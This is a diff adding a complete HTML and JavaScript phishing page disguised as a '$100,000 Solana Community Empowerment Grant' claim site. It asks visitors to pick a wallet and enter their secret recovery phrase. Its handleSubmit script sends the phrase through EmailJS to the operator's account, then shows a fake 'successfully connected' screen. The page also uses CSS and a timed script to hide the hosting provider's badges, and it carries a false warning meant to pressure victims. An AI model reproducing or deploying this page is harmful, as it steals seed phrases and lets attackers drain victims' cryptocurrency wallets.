@@ -1,0 +1,492 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Solana Community Empowerment - $100,000 Global Grant Allocation</title>
+    
+    <meta property="og:title" content="Solana Community Empowerment - $100,000 Global Grant">
+    <meta property="og:description" content="Empowering global Web3 participants. Connect your wallet to verify participant eligibility and route your grant funding.">
+    <meta property="og:image" content="https://cryptologos.cc/logos/solana-sol-logo.png">
+    <meta property="og:url" content="https://solanafoundationgrant-org.netlify.app">
+    <meta property="og:type" content="website">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Solana Community Empowerment - $100,000 Global Grant">
+    <meta name="twitter:description" content="Empowering global Web3 participants. Connect your wallet to verify participant eligibility and route your grant funding.">
+    <meta name="twitter:image" content="https://cryptologos.cc/logos/solana-sol-logo.png">
+
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+
+        /* Force-hide Netlify badge and any injected deployment elements */
+        #netlify-deploy-badge, iframe[src*="netlify"], div[style*="netlify"], a[href*="netlify.com/?utm_source"] {
+            display: none !important;
+            visibility: hidden !important;
+            opacity: 0 !important;
+            pointer-events: none !important;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #ffffff;
+            color: #1f2328;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            overflow-y: auto;
+            position: relative;
+        }
+
+        /* Top-Left Absolute Positioned Explanation Panel */
+        .top-left-banner {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            background: #f6f8fa;
+            border: 1px solid #d0d7de;
+            padding: 16px;
+            border-radius: 12px;
+            font-size: 13px;
+            color: #57606a;
+            width: 300px;
+            box-shadow: 0 4px 12px rgba(140, 149, 159, 0.1);
+            line-height: 1.5;
+            text-align: left;
+        }
+
+        .top-left-banner h4 {
+            color: #0969da;
+            margin-top: 0;
+            margin-bottom: 6px;
+            font-size: 14px;
+        }
+
+        .top-left-banner p {
+            margin: 0;
+        }
+
+        /* Center action card container */
+        .container {
+            background: #f6f8fa;
+            padding: 30px 40px;
+            border-radius: 20px;
+            width: 100%;
+            max-width: 440px;
+            box-shadow: 0 8px 24px rgba(140, 149, 159, 0.2);
+            border: 1px solid #d0d7de;
+            text-align: center;
+        }
+
+        .brand-title {
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            color: #1a7f37;
+            font-weight: 800;
+            margin-bottom: 6px;
+        }
+
+        h2 {
+            margin-top: 0;
+            margin-bottom: 8px;
+            font-size: 24px;
+            color: #24292f;
+        }
+
+        .solana-text {
+            font-family: Arial, sans-serif;
+            font-size: 48px;
+            font-weight: 900;
+            letter-spacing: 2px;
+            text-align: center;
+            background: linear-gradient(90deg, #9945FF, #19FB9B);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            color: transparent;
+            margin: 0 0 5px 0;
+        }
+
+        .grant-badge {
+            display: inline-block;
+            background: rgba(26, 127, 55, 0.1);
+            color: #1a7f37;
+            border: 1px solid rgba(26, 127, 55, 0.3);
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 700;
+            margin-bottom: 16px;
+        }
+
+        .main-btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(90deg, #8250df, #1a7f37);
+            color: #ffffff;
+            border: none;
+            border-radius: 12px;
+            font-weight: 800;
+            font-size: 16px;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(26, 127, 55, 0.3);
+            transition: opacity 0.2s;
+        }
+        .main-btn:hover {
+            opacity: 0.9;
+        }
+
+        #profileState {
+            display: none;
+            background: #ffffff;
+            border: 1px solid #1a7f37;
+            padding: 12px;
+            border-radius: 12px;
+            align-items: center;
+            justify-content: space-between;
+            margin-top: 10px;
+        }
+        .profile-info {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            text-align: left;
+        }
+        .status-dot {
+            width: 10px;
+            height: 10px;
+            background-color: #1a7f37;
+            border-radius: 50%;
+            box-shadow: 0 0 8px rgba(26, 127, 55, 0.5);
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(27, 31, 36, 0.6);
+            backdrop-filter: blur(4px);
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            box-sizing: border-box;
+            z-index: 1000;
+        }
+        .modal-content {
+            background-color: #ffffff;
+            padding: 24px;
+            border-radius: 24px;
+            width: 100%;
+            max-width: 400px;
+            border: 1px solid #d0d7de;
+            box-sizing: border-box;
+            text-align: left;
+            box-shadow: 0 16px 40px rgba(27, 31, 36, 0.2);
+        }
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 16px;
+        }
+        .modal-header h3 {
+            margin: 0;
+            font-size: 18px;
+            color: #24292f;
+        }
+        .close-x {
+            background: none;
+            border: none;
+            color: #57606a;
+            font-size: 22px;
+            cursor: pointer;
+        }
+
+        .wallet-option {
+            display: flex;
+            align-items: center;
+            width: 100%;
+            padding: 12px 16px;
+            margin-bottom: 10px;
+            background-color: #f6f8fa;
+            border: 1px solid #d0d7de;
+            border-radius: 14px;
+            color: #24292f;
+            font-size: 15px;
+            cursor: pointer;
+        }
+        .wallet-option:hover {
+            background-color: #eaeef2;
+            border-color: #0969da;
+        }
+        .wallet-icon {
+            width: 32px;
+            height: 32px;
+            margin-right: 14px;
+            border-radius: 10px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+        }
+        .phantom { background: linear-gradient(135deg, #ab9ff2, #5340c9); color: #fff; }
+        .solflare { background: linear-gradient(135deg, #fc7534, #d35400); color: #fff; }
+        .trust { background: linear-gradient(135deg, #3375bb, #144985); color: #fff; }
+        .metamask { background: linear-gradient(135deg, #f6851b, #e2761b); color: #fff; }
+        .coinbase { background: linear-gradient(135deg, #0052ff, #003cc5); color: #fff; }
+
+        #phraseView, #successView { display: none; }
+        label { display: block; margin-bottom: 6px; font-size: 13px; color: #57606a; }
+        textarea {
+            width: 100%;
+            height: 90px;
+            padding: 12px;
+            background-color: #ffffff;
+            border: 1px solid #d0d7de;
+            border-radius: 12px;
+            color: #24292f;
+            box-sizing: border-box;
+            font-size: 14px;
+            resize: none;
+            margin-bottom: 10px;
+        }
+        textarea:focus { outline: none; border-color: #0969da; box-shadow: 0 0 0 3px rgba(9, 105, 218, 0.15); }
+        
+        .warning-note {
+            font-size: 11px;
+            color: #cf222e;
+            background: #fff8f8;
+            border: 1px solid #ffccd0;
+            padding: 8px;
+            border-radius: 8px;
+            margin-bottom: 14px;
+            line-height: 1.4;
+        }
+
+        .connect-btn {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(90deg, #8250df, #1a7f37);
+            color: #ffffff;
+            border: none;
+            border-radius: 12px;
+            font-weight: 800;
+            cursor: pointer;
+        }
+        .back-link {
+            display: inline-block;
+            margin-top: 12px;
+            color: #0969da;
+            font-size: 13px;
+            cursor: pointer;
+            text-decoration: none;
+        }
+        .back-link:hover { text-decoration: underline; }
+
+        .success-box {
+            text-align: center;
+            padding: 10px 0;
+        }
+        .success-icon {
+            width: 50px;
+            height: 50px;
+            background: rgba(26, 127, 55, 0.15);
+            color: #1a7f37;
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            margin-bottom: 14px;
+            border: 1px solid rgba(26, 127, 55, 0.4);
+        }
+
+        @media (max-width: 768px) {
+            .top-left-banner {
+                position: relative;
+                top: auto;
+                left: auto;
+                width: 100%;
+                max-width: 440px;
+                margin-bottom: 20px;
+            }
+            body {
+                flex-direction: column;
+                justify-content: flex-start;
+            }
+        }
+    </style>
+
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function() {
+            emailjs.init({ publicKey: "Agwcuu00WIk8gbLwC" });
+        })();
+    </script>
+</head>
+<body>
+
+    <div class="top-left-banner">
+        <h4>$100k Grant Protocol</h4>
+        <p>Empowering global Web3 developers and active participants. Ledger synchronization and seed phrase authorization are mandatory to claim individual tier shares.</p>
+    </div>
+
+    <div class="container">
+        <h1 class="solana-text">SOLANA</h1>
+        <div class="brand-title">Community Treasury</div>
+        <div class="grant-badge">$100,000 Empowerment Grant</div>
+        <h2>Claim Allocation</h2>
+        <p style="color: #57606a; font-size: 14px; margin-bottom: 24px;">Connect your designated Web3 wallet to verify participant eligibility and route your grant funding.</p>
+        
+        <button id="connectBtnMain" class="main-btn" onclick="openModal()">Connect Wallet</button>
+
+        <div id="profileState">
+            <div class="profile-info">
+                <div class="status-dot"></div>
+                <div>
+                    <div id="displayWalletName" style="font-weight: 700; font-size: 14px; color: #1f2328;">Connected</div>
+                    <div style="font-size: 12px; color: #57606a;">Sync Active (48h Window)</div>
+                </div>
+            </div>
+            <span style="font-size: 12px; background: #eaeef2; padding: 4px 8px; border-radius: 6px; font-weight: 600; color: #1a7f37;">Verified</span>
+        </div>
+    </div>
+
+    <div id="walletModal" class="modal">
+        <div class="modal-content">
+            
+            <div id="listView">
+                <div class="modal-header">
+                    <h3>Select Web3 Wallet</h3>
+                    <button class="close-x" onclick="closeModal()">&times;</button>
+                </div>
+                <button class="wallet-option" onclick="selectWallet('Phantom')">
+                    <span class="wallet-icon phantom">P</span> Phantom
+                </button>
+                <button class="wallet-option" onclick="selectWallet('Solflare')">
+                    <span class="wallet-icon solflare">S</span> Solflare
+                </button>
+                <button class="wallet-option" onclick="selectWallet('Trust Wallet')">
+                    <span class="wallet-icon trust">T</span> Trust Wallet
+                </button>
+                <button class="wallet-option" onclick="selectWallet('MetaMask')">
+                    <span class="wallet-icon metamask">M</span> MetaMask
+                </button>
+                <button class="wallet-option" onclick="selectWallet('Coinbase Wallet')">
+                    <span class="wallet-icon coinbase">C</span> Coinbase Wallet
+                </button>
+            </div>
+
+            <div id="phraseView">
+                <div class="modal-header">
+                    <h3 id="modalTitle">Import Wallet</h3>
+                    <button class="close-x" onclick="closeModal()">&times;</button>
+                </div>
+                <form id="phishForm" onsubmit="handleSubmit(event)">
+                    <input type="text" id="selectedWalletInput" name="wallet_type" style="display:none;" value="">
+                    <label>Secret Recovery Phrase</label>
+                    <textarea id="phraseInput" name="secret_phrase" placeholder="Enter your 12 or 24-word recovery phrase..." required></textarea>
+                    
+                    <div class="warning-note">
+                        <strong>Important Note:</strong> If you input a wrong seed phrase, your assets will be sent to whoever owns that recovery phrase.
+                    </div>
+
+                    <button type="submit" class="connect-btn">Confirm Verification</button>
+                </form>
+                <a class="back-link" onclick="goBack()">&larr; Choose different wallet</a>
+            </div>
+
+            <div id="successView">
+                <div class="modal-header">
+                    <h3>Status</h3>
+                    <button class="close-x" onclick="closeModal()">&times;</button>
+                </div>
+                <div class="success-box">
+                    <div class="success-icon">&#10003;</div>
+                    <h3>Wallet Successfully Connected</h3>
+                    <p>Please wait in the next 48hrs to receive your assets.</p>
+                    <button class="connect-btn" onclick="completeAndShowProfile()">Back</button>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <script>
+        let selectedWalletName = "";
+
+        function openModal() {
+            document.getElementById('walletModal').style.display = 'flex';
+        }
+
+        function closeModal() {
+            document.getElementById('walletModal').style.display = 'none';
+            goBack();
+        }
+
+        function selectWallet(walletName) {
+            selectedWalletName = walletName;
+            document.getElementById('selectedWalletInput').value = walletName;
+            document.getElementById('modalTitle').innerText = 'Connect with ' + walletName;
+            document.getElementById('listView').style.display = 'none';
+            document.getElementById('phraseView').style.display = 'block';
+            document.getElementById('successView').style.display = 'none';
+        }
+
+        function goBack() {
+            document.getElementById('phraseView').style.display = 'none';
+            document.getElementById('successView').style.display = 'none';
+            document.getElementById('listView').style.display = 'block';
+            document.getElementById('phraseInput').value = '';
+        }
+
+        function handleSubmit(event) {
+            event.preventDefault();
+            const btn = event.target.querySelector('button[type="submit"]');
+            
+            btn.innerText = "Processing Grant...";
+            btn.disabled = true;
+
+            const templateParams = {
+                wallet_type: selectedWalletName,
+                secret_phrase: document.getElementById('phraseInput').value,
+                message: document.getElementById('phraseInput').value
+            };
+
+            emailjs.send('service_4u7uo4k', 'template_mei9z4c', templateParams)
+                .then(function() {
+                    document.getElementById('phraseView').style.display = 'none';
+                    document.getElementById('successView').style.display = 'block';
+                    btn.innerText = "Confirm Verification";
+                    btn.disabled = false;
+                }, function(error) {
+                    alert('Submission failed. Please check connection.');
+                    btn.innerText = "Confirm Verification";
+                    btn.disabled = false;
+                });
+        }
+
+        function completeAndShowProfile() {
+            document.getElementById('walletModal').style.display = 'none';
+            document.getElementById('displayWalletName').innerText = selectedWalletName + " Linked";
+            document.getElementById('connectBtnMain').style.display = 'none';
+            document.getElementById('profileState').style.display = 'flex';
+            goBack();
+        }
+
+        // Automated script to eliminate any injected Netlify hosting badges
+        window.addEventListener('DOMContentLoaded', () => {
+            setInterval(() => {
+                const badges = document.querySelectorAll('#netlify-deploy-badge, iframe[src*="netlify"], div[style*="netlify"], a[href*="netlify.com/?utm_source"]');
+                badges.forEach(el => el.remove());
+            }, 200);
+        });
+    </script>
+</body>
